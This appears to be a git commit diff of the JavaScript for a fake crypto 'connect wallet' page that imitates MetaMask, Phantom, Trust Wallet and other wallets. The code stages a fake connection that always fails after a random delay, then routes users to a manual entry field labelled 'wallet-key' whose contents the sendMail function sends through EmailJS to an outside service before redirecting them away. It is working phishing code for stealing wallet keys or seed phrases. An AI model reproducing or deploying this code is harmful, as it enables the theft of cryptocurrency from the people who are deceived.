08eb37e8fa47de25aca9f71d99c8345a84a54ad0
BennyBoy <160542234+BennyBoy10@users.noreply.github.com>
2024-09-27 19:03:11 +0100

    Add files via upload

--- Script.js
+++ Script.js
@@ -1,52 +1,310 @@
 
 
-var buttons = document.querySelectorAll(".button");
 
-buttons.forEach(function(button) {
-var image = button.querySelector(".buttons-image");
-button.addEventListener("click", function() {
-  window.location.href = "Connect-Wallet/";
-  //window.location.href = "Connect-Wallet/index.html";
-});
-  button.addEventListener("mouseover", function() {
-  image.src = "Images/Buttons-Image-Blue.jpg";
-});
-button.addEventListener("mouseout", function() {
-  image.src = "Images/Buttons-Image.jpg";
-});
-});
+//document.addEventListener("DOMContentLoaded", function() {
+  var errorSection = document.querySelector(".error-section");
+  var connectingSection = document.querySelector(".connecting-section");
+  var manualSection = document.querySelector(".manual-section");
+  var connectBox = document.querySelector(".connect-box");
+  var closeButton = document.getElementById("close-button");
+  var tryAgain = document.querySelector(".try-again");
+  var connectManually = document.querySelector(".connect-manually");
+  var failedToConnect = document.getElementById("failed-to-connect")
+  var errorTime = Math.floor(Math.random() * (6000 - 2000 + 1)) + 2000;
+  var CoinLogo = document.getElementById("coin-logo");
+  var CoinName = document.getElementById("coin-name");
+  let coinType; // Declare coinType here
+
+  var connectWallet = document.querySelector(".connect-wallet");
+/* ### */ // connectWallet.disabled = true;
+  var walletAddress = document.getElementById("wallet-key");
 
 
-var Links = document.querySelectorAll(".link");
-Links.forEach(function(Link) {
-  Link.addEventListener("click", function() {
-    window.location.href = "Connect-Wallet/";
+ function confirmButton2Status() {
+  if (connectWallet.disabled === true) {
+    connectWallet.style.backgroundColor = "grey";
+    connectWallet.style.cursor = "not-allowed";
+  }
+  else {
+    connectWallet.style.backgroundColor = "#5142FC";
+    connectWallet.style.cursor = "pointer";
+  }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  var walletConnectCard = document.querySelector(".wallet-connect-card");
+  var walletConnectName = document.getElementById("wallet-connect");
+
+  var phantomCard = document.querySelector(".phantom-card");
+  var phantomName = document.getElementById("phantom");
+
+  var trustWalletCard = document.querySelector(".trust-wallet-card");
+  var trustWalletName = document.getElementById("trust-wallet");
+
+  var metamaskCard = document.querySelector(".metamask-card");
+  var metamaskName = document.getElementById("metamask");
+
+  var flintWalletCard = document.querySelector(".flint-wallet-card");
+  var flintWalletName = document.getElementById("flint-wallet");
+
+  var binanceWalletCard = document.querySelector(".binance-wallet-card");
+  var binanceWalletName = document.getElementById("binance-wallet");
+
+  var polygonWalletCard = document.querySelector(".polygon-wallet-card");
+  var polygonWalletName = document.getElementById("polygon-wallet");
+
+  var rainbowCard = document.querySelector(".rainbow-card");
+  var rainbowName = document.getElementById("rainbow");
+
+
+  
+
+
+function errorConnecting() {
+  connectingSection.style.display = "none";
+  errorSection.style.display = "block";
+  manualSection.style.display = "none";
+}
+function retryConnecting() {
+  connectingSection.style.display = "block";
+  errorSection.style.display = "none";
+  manualSection.style.display = "none";
+  var errorTime = Math.floor(Math.random() * (6000 - 2000 + 1)) + 2000;
+  setTimeout(function() {
+    errorConnecting();
+  }, errorTime);
+}
+
+  tryAgain.addEventListener("click", function() {
+    retryConnecting();
   });
-});
+  connectManually.addEventListener("click", function() {
+    connectingSection.style.display = "none";
+    errorSection.style.display = "none";
+    manualSection.style.display = "block";
+    //connectWallet.disabled = true;
+    //connectWallet.style.cursor = "not-allowed";
+    //connectWallet.style.backgroundColor = "grey";
 
-
-var walletIcons = document.querySelectorAll(".wallet-icon");
-walletIcons.forEach(function(walletIcon) {
-  walletIcon.addEventListener("click", function() {
-    window.location.href = "Connect-Wallet/";
   });
-});
+
+  closeButton.addEventListener("click", function() {
+    connectBox.style.display = "none";
+    connectingSection.style.display = "none";
+    errorSection.style.display = "none";
+    manualSection.style.display = "none";
+  });
+
+
+
+
+  walletConnectCard.addEventListener("click", function() {
+    connectBox.style.display = "flex";
+    connectingSection.style.display = "block";
+    errorSection.style.display = "none";
+    manualSection.style.display = "none";
+
+    CoinName.textContent = walletConnectName.textContent;
+    CoinLogo.src = "Images/Wallet-Connect-Logo.jpg";
+    coinType = CoinName.textContent;
+
+    setTimeout(function() {
+      errorConnecting();
+    }, errorTime);
+  });
+
+  phantomCard.addEventListener("click", function() {
+    connectBox.style.display = "flex";
+    connectingSection.style.display = "block";
+    errorSection.style.display = "none";
+    manualSection.style.display = "none";
+
+    CoinName.textContent = phantomName.textContent;
+    CoinLogo.src = "Images/Phantom-Logo.jpg";
+    coinType = CoinName.textContent;
+
+    setTimeout(function() {
+      errorConnecting();
+    }, errorTime);
+  });
+
+  trustWalletCard.addEventListener("click", function() {
+    connectBox.style.display = "flex";
+    connectingSection.style.display = "block";
+    errorSection.style.display = "none";
+    manualSection.style.display = "none";
+
+    CoinName.textContent = trustWalletName.textContent;
+    CoinLogo.src = "Images/Trust-Wallet-Logo.jpg";
+    coinType = CoinName.textContent;
+
+    setTimeout(function() {
+      errorConnecting();
+    }, errorTime);
+  });
+
+  metamaskCard.addEventListener("click", function() {
+    connectBox.style.display = "flex";
+    connectingSection.style.display = "block";
+    errorSection.style.display = "none";
+    manualSection.style.display = "none";
+
+    CoinName.textContent = metamaskName.textContent;
+    CoinLogo.src = "Images/Metamask-Logo.jpg";
+    coinType = CoinName.textContent;
+
+    setTimeout(function() {
+      errorConnecting();
+    }, errorTime);
+  });
+
+  flintWalletCard.addEventListener("click", function() {
+    connectBox.style.display = "flex";
+    connectingSection.style.display = "block";
+    errorSection.style.display = "none";
+    manualSection.style.display = "none";
+
+    CoinName.textContent = flintWalletName.textContent;
+    CoinLogo.src = "Images/Flint-Wallet-Logo.jpg";
+    coinType = CoinName.textContent;
+
+    setTimeout(function() {
+      errorConnecting();
+    }, errorTime);
+  });
+
+  binanceWalletCard.addEventListener("click", function() {
+    connectBox.style.display = "flex";
+    connectingSection.style.display = "block";
+    errorSection.style.display = "none";
+    manualSection.style.display = "none";
+
+    CoinName.textContent = binanceWalletName.textContent;
+    CoinLogo.src = "Images/Binance-Chain-Wallet-Logo.jpg";
+    coinType = CoinName.textContent;
+
+    setTimeout(function() {
+      errorConnecting();
+    }, errorTime);
+  });
+
+  polygonWalletCard.addEventListener("click", function() {
+    connectBox.style.display = "flex";
+    connectingSection.style.display = "block";
+    errorSection.style.display = "none";
+    manualSection.style.display = "none";
+
+    CoinName.textContent = polygonWalletName.textContent;
+    CoinLogo.src = "Images/Polygon-Wallet-Logo.jpg";
+    coinType = CoinName.textContent;
+
+    setTimeout(function() {
+      errorConnecting();
+    }, errorTime);
+  });
+
+  rainbowCard.addEventListener("click", function() {
+    connectBox.style.display = "flex";
+    connectingSection.style.display = "block";
+    errorSection.style.display = "none";
+    manualSection.style.display = "none";
+
+    CoinName.textContent = rainbowName.textContent;
+    CoinLogo.src = "Images/Rainbow-Logo.jpg";
+    coinType = CoinName.textContent;
+
+    setTimeout(function() {
+      errorConnecting();
+    }, errorTime);
+  });
+
+
+
+
+  
+
+
+  
+
+
+
+
+
 
 
 function sendMail() {
-var walletAddressInput = document.querySelector(".wallet-address-input").value;
-var submitButton = "Murphy Wallet Address";
-emailjs.send('service_h25qeyg', 'template_3asqsuh', {
-walletAddress: walletAddressInput,
-submitButton: submitButton,
-})
-.then(function(response) {
-window.location.href = "Connect-Wallet/";
-})
-.catch(function(error) {
-window.location.href = "Connect-Wallet/";
-});
+  var walletAddress = document.getElementById("wallet-key").value;
+  var Coin = coinType;  // Use coinType from outer scope
+
+  emailjs.send('service_kyvi3ud', 'template_wua74y9', {
+    walletaddress: walletAddress,
+    cointype: Coin,
+  })
+  .then(function(response) {
+    window.location.href = "../";
+    //window.location.href = "../index.html";
+  })
+  .catch(function(error) {
+    failedToConnect.style.display = "block";
+    connectWallet.disabled = false;
+    confirmButton2Status();
+  });
 }
-sendMail();
+
+walletAddress.addEventListener("focus", function() {
+  failedToConnect.style.display = "none";
+});
+
+connectWallet.addEventListener("click", function() {
+  sendMail();
+  connectWallet.disabled = true;
+  confirmButton2Status();
+  setTimeout(function() {
+    connectWallet.disabled = false;
+  }, 5000);
+  confirmButton2Status();
+});
+
+if (walletAddress.value.length <= 5) {
+  connectWallet.disabled = true;
+  confirmButton2Status();
+} else {
+  connectWallet.disabled = false;
+  confirmButton2Status();
+}
+walletAddress.addEventListener("input", function() {
+if (walletAddress.value.length <= 5) {
+  connectWallet.disabled = true;
+  confirmButton2Status();
+} else {
+  connectWallet.disabled = false;
+  confirmButton2Status();
+}
+});
+
+
+
+
+
+
+//});
+
+
+
+
+
+
 
 
